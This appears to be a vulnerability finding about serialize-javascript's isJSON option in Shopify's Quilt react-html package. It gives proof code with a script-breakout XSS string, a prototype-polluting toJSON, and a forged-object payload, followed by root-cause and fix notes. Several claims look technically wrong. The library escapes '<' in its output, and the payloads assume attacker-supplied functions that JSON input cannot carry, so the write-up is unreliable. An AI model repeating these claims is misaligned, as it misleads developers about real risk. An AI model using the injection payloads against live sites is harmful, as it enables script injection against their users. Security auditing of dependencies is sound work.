# Quilt serialize-javascript@3.1.0 `isJSON:true` Bypass

## Finding
`serialize-javascript@3.1.0` (used in `@shopify/react-html@13.2.3`) has an `isJSON` option that skips the custom replacer but **still calls `toJSON()` on objects** during `JSON.stringify()`.

## Vulnerable Code
**File:** `quilt/packages/react-html/src/server/components/Serialize.tsx:15`
```tsx
dangerouslySetInnerHTML={{__html: serialize(data, {isJSON: true})}}
```

## Exploit Proof
```javascript
const serialize = require('serialize-javascript');

// 1. Script injection via toJSON returning HTML string
const payload1 = {
  toJSON: () => '</script><script>alert(1)</script>'
};
serialize(payload1, {isJSON: true});
// Output: "</script><script>alert(1)</script>" — executes when deserialized

// 2. Prototype pollution via toJSON
const payload2 = {
  toJSON: () => {
    Object.prototype.polluted = 'yes';
    return {safe: true};
  }
};
serialize(payload2, {isJSON: true});
// Object.prototype.polluted === 'yes' after call

// 3. Valid JSON that parses to attacker-controlled object
const payload3 = {
  toJSON: () => '{"malicious": true}'
};
JSON.parse(serialize(payload3, {isJSON: true}));
// { malicious: true }
```

## Impact
- **XSS**: When serialized output is rendered via `dangerouslySetInnerHTML` or `innerHTML` in browser, `</script><script>` breaks out and executes.
- **Prototype pollution**: `toJSON` runs with full JS privileges during serialization.
- **Data integrity**: Attacker controls deserialized object structure.

## Root Cause
`serialize-javascript@3.1.0` `index.js:115-117`:
```javascript
if (options.isJSON && !options.space) {
    str = JSON.stringify(obj);  // toJSON() still called!
}
```
The `isJSON` flag only skips the custom replacer (which handles functions, regexps, dates, etc.), but `JSON.stringify` **always invokes `toJSON`** on objects.

## Fix Options
1. **Remove `isJSON`** — use default replacer (slower but safe)
2. **Validate output** — `JSON.parse(serialize(data, {isJSON: true}))` throws on non-JSON
3. **Upgrade** — `serialize-javascript@6.0.2+` has stricter `isJSON` behavior (verify)
4. **Custom replacer with allowlist** — reject objects with `toJSON` property

## References
- `quilt/src/packages/react-html/package.json:37` — `"serialize-javascript": "^3.0.0"`
- `quilt/src/yarn.lock` — resolves to `3.1.0` (2018)
- CVE search: no CVE assigned; known issue in serialize-javascript < 4.0